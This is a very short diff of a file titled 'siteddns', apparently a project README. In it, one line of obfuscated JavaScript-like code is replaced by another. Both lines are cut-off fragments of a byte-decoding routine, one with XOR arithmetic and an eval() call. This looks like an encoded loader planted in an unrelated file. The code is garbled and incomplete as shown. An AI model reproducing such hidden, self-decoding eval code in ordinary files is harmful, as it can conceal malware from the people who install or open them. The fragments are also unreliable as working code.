@@ -1,2 +1,2 @@
  # siteddns
->2);bl[dl]=(bl[dl]^229)^bl[0];}while(--dl>=3);";eval(dl);dl=45;do{if(dl
+49)break;le[ne]=(-((le[ne]-235)&0xff))&0xff;le[ne]=(le[ne]>>7)|((le[ne]
